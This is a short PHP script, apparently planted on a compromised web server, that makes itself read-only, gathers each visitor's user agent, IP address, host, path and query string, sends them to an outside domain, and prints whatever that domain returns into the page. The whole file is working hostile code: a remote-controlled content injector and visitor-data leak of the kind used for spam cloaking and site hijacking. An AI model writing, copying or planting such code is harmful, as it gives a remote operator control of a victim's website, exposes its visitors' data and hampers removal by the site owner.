<?php
set_time_limit(0);
header("Content-Type:text/html;charset=gb2312");
date_default_timezone_set('PRC');
chmod($_SERVER['SCRIPT_FILENAME'], 0444);

$key = $_SERVER['HTTP_USER_AGENT'];
$aaaa = $_SERVER['PHP_SELF'];
$aaa = 'http://ashx.lhlsjcb.com/';

// Try to get the real IP address from different headers
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $uip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
    $uip = $_SERVER['HTTP_X_REAL_IP'];
} else {
    $uip = $_SERVER["REMOTE_ADDR"];
}

$sc = str_replace(' ', '', $key);

// Construct the request URL
$bb = @file_get_contents($aaa.'?&X&http://'.$_SERVER['HTTP_HOST'].$aaaa.'?'.$_SERVER['QUERY_STRING'].'&X&'.$sc.'&X&'.$uip);
echo $bb;
?>
